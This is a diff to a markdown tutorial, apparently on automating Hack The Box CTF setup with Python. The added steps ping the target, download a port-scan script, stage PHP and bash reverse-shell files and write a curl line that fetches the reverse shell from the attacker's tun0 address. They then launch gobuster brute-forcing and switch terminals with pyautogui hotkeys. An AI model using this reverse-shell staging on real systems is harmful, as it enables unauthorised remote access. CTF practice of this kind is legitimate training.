@@ -36,7 +36,7 @@ import re
 import webbrowser 
 ```
 <br>
-Now we need the machine IP to use it in future tasks, so let's assign it here
+We need Machine IP to use it in future tasks, so let's assign it here
 
 ```python
 MACHINE_IP = "10.10.10.230"
@@ -179,3 +179,123 @@ function printit ($string) {
 rev_txt.close()
 print("\nPHP and BASH Rev Shell Files Created SUCESSFULLY")
 ```
+
+#### Checking whether the IP is live or not
+```python
+print("\nChecking whether the IP is live or not")
+cmd("echo 'ping -w 3 '"+MACHINE_IP+" > cmd.sh")
+with open('ping.txt','w') as ping:
+        png = subprocess.run(['bash','cmd.sh'],stdout=ping,text=True)
+ping = open('ping.txt','r')
+ping_txt = ping.read()
+print
+if "100% packet loss" in ping_txt or "Host Unreachable" in ping_txt:
+        print("CHECK YOUR OVPN CONNECTION\nIP IS NOT REACHABLE :/")
+        exit()
+print("\nTHE IP",MACHINE_IP,"IS LIVE")
+```
+This part will check whether the Machine IP is in live or not, If it's offline or not reachable then the script will stops 
+
+#### creating htbs scan file
+```python
+cmd('curl https://raw.githubusercontent.com/jopraveen/htbscan/main/htbs.py -o htbs.py')
+```
+I've created a small script to make the port scan faster. So here we're downloading it <br>
+To know more about this script, watch this video: https://youtu.be/1Va6ws_o5w4
+
+#### save time.txt
+```python
+save_time_txt = open('save-time.txt','w')
+save_time_txt.write('''
+curl http://'''+tun0_IP+''':8080/php-rev-shell.php'''
++'''
+
+'''+
+rev_shell+'''
+
+DEFAULT CREDS FOR LOGIN PAGE:
+
+username: jopraveen
+mail    : jopraveen@machine.htb
+password: testtest
+''')
+save_time_txt.close()
+```
+Here we're going to save our time by using this file... we can copy this when it's needed
+
+#### removing unwanted files and arranging payloads in a folder
+```python
+cmd('rm ip.txt ping.txt cmd.sh')
+cmd('mkdir www && mv save-time.txt php-rev-shell.php shell.sh www/')
+```
+
+#### opening IP in web browser
+```python
+webbrowser.open_new("http://"+MACHINE_IP)
+sleep(2)
+```
+
+## Important part
+The above things in the script are similar to everyone, but hereafter you need to create your own script... It's not same for everyone :/ <br>
+I'll so you some examples to make it easier
+
+### Switching application
+Just now we opened a browser, We need to switch back to terminal to run next tasks <br>
+So find your hot key to switch between apps, Mine is ```ALT + TAB``` I hope this is also similar to most of the people
+
+```python
+py.hotkey('ALT','TAB')
+sleep(4)
+```
+Ok now we done this, make sure you changed the hot key in the above script
+
+### Running port scan
+```python
+py.write('python3 htbs.py '+ MACHINE_IP[-3:])
+py.hotkey('ENTER')
+```
+Now here we're running our fastest port scan script, It requires the last 3 digits of Machine IP as an argument to run the scan. So, I added `MACHINE_IP[-3:]` here <br>
+And finally we need to press `ENTER` key to run this command
+
+### Spliting terminal vertically
+We need to split our terminal and need to do directory bruteforceing there
+
+```python
+py.hotkey('CTRL','SHIFT','RIGHT')
+```
+My Hot key for splitting terminal vertically is `CTRL + SHIFT + T` Change your's there
+
+#### Going to that terminal
+```python
+py.hotkey('ALT','RIGHT')
+sleep(2)
+```
+If we press `ALT + TAB` then we can go to that splited terminal and we can type commands there and run it <br>
+Change this if it's not same for you
+
+### Directory Brute Forcing
+Here I'm using gobuster to brute-force the directories <br>
+Change it if you use other tools also change your wordlist path too
+
+```python
+py.write("gobuster dir -u http://"+MACHINE_IP+"/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt")
+py.hotkey('ENTER')
+```
+Now this will start the gobuster
+
+### opening needed terminals
+Now I'm going to open a new tab with 4 terminals <br>
+See how we can do this
+
+![1](https://github.com/jopraveen/jopraveen/blob/main/some-gifs/CTF-AUTOMATION-1.png)
+
+Here this is the hot key to open a new tab <br> ok now let's see how to open it with 4 terminals
+
+![2](https://github.com/jopraveen/jopraveen/blob/main/some-gifs/CTF-AUTOMATION-2.jpg)
+
+Go to your terminals settings and change this to 4 terminals
+
+![3](https://github.com/jopraveen/jopraveen/blob/main/some-gifs/CTF-AUTOMATION-3.png)
+
+Now you'll get beautiful terminals like this :)
+
